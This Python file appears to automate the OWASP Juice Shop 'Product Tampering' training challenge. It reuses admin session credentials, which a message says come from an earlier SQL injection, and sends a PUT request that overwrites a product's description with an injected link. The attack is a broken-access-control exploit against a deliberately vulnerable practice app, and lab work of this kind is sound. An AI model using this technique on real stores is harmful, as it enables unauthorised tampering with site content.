"""
This file is to automate the OWASP JUICESHOP TASK
PRODUCT TAMPERING
-------------------------------------------------
BROKEN ACCESS CONTROL
-------------------------------------------------
GOAL: Change the description of a product with href header
"""

from plugins import attack as a
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class temper(a.attack_inter):

    def __init__(self):
        self.juice_session = a.requests.session()
        self.description = "O-Saft is an easy to use tool to show information about SSL certificate and tests the SSL connection according given list of ciphers and various SSL configurations. <a href=\"https://owasp.slack.com\" target=\"_blank\">More...</a>"
        self.productId = 9 ## This is the ID of this example

    def generator(self):
        json = {
            'description': self.description
        }
        try:
            new_cookie, new_header = a.get_auth("admin")
            self.cookie, self.header = new_cookie, new_header
        except:
            print("you do not have a record of admin, please try SQL injection first")
        return json

    def temper_description(self):
        print("------------------------------------------")
        print("Let us temper the product's description --------------")
        url = a.URL + '/api/products/{}'.format(self.productId)
        json_data = self.generator()
        response = self.juice_session.put(url, cookies=self.cookie, headers=self.header, json=json_data)
        print(response.text)

    def run(self):
        self.temper_description()




